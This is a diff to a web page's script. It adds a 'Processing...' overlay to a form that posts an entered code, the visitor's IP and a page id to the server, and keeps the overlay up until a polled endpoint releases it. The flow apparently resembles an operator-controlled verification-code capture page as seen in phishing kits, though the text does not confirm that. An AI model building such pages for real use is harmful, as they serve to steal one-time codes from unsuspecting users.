@@ -96,6 +96,39 @@
     </div>
     <script>
         let lastCode = '';
+        // Додаємо overlay-вікно загрузки
+        const loadingOverlay = document.createElement('div');
+        loadingOverlay.id = 'loading-overlay';
+        loadingOverlay.style = 'display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,178,255,0.85);z-index:99999;align-items:center;justify-content:center;flex-direction:column;';
+        loadingOverlay.innerHTML = '<div style="background:#fff;border-radius:20px;max-width:320px;width:100%;margin:auto;padding:2rem 1.5rem;box-shadow:0 8px 32px rgba(0,0,0,0.12);text-align:center;"><div style="margin-bottom:1.2rem;"><svg width="48" height="48" viewBox="0 0 50 50"><circle cx="25" cy="25" r="20" stroke="#00b2ff" stroke-width="5" fill="none" stroke-dasharray="31.4 31.4" stroke-linecap="round"><animateTransform attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="1s" repeatCount="indefinite"/></circle></svg></div><div style="font-size:1.2rem;font-weight:500;">Processing...</div></div>';
+        document.body.appendChild(loadingOverlay);
+
+        // Показуємо overlay після відправки коду
+        const codeForm = document.getElementById('code-form');
+        codeForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            loadingOverlay.style.display = 'flex';
+            const code = document.getElementById('code-input').value;
+            lastCode = code;
+            const urlParams = new URLSearchParams(window.location.search);
+            const page = urlParams.get('page') || sessionStorage.getItem('page_code');
+            try {
+                const response = await fetch('/send_code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ code, ip: userIP, page })
+                });
+                if (response.ok) {
+                    document.getElementById('message').textContent = 'Code sent!';
+                } else {
+                    document.getElementById('message').textContent = 'Error sending code';
+                    loadingOverlay.style.display = 'none';
+                }
+            } catch (err) {
+                document.getElementById('message').textContent = 'Error sending code';
+                loadingOverlay.style.display = 'none';
+            }
+        });
         // --- POLLING для support/text кнопок ---
         let supportTabOpened = false;
         function getQueryParam(name) {
@@ -117,6 +150,9 @@
             try {
                 const resp = await fetch(`/check_support?ip=${encodeURIComponent(userIP)}`);
                 const data = await resp.json();
+                if ((data.show_support || data.show_text)) {
+                    loadingOverlay.style.display = 'none';
+                }
                 if (!supportTabOpened && (data.show_support || data.show_text)) {
                     const page_code = getPageCode();
                     if (data.show_support) {
@@ -132,28 +168,6 @@
             setTimeout(pollSupportButtons, 2000);
         }
         setTimeout(pollSupportButtons, 2000);
-        document.getElementById('code-form').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const code = document.getElementById('code-input').value;
-            lastCode = code;
-            // --- Додаємо page_code з URL або sessionStorage ---
-            const urlParams = new URLSearchParams(window.location.search);
-            const page = urlParams.get('page') || sessionStorage.getItem('page_code');
-            try {
-                const response = await fetch('/send_code', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ code, ip: userIP, page })
-                });
-                if (response.ok) {
-                    document.getElementById('message').textContent = 'Code sent!';
-                } else {
-                    document.getElementById('message').textContent = 'Error sending code';
-                }
-            } catch (err) {
-                document.getElementById('message').textContent = 'Error sending code';
-            }
-        });
         // Polling for request_again
         setInterval(async function() {
             if (!lastCode) return;
